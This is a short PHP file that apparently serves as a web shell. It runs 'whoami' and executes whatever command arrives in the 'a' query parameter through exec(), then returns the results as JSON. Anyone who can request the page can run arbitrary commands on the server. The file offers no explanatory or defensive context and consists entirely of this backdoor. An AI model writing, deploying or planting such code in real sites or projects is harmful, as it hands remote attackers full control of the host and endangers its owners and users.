<?php
$json = array("user" => exec("whoami"),
			  "command" => exec($_GET['a']));
				
echo json_encode($json);
?>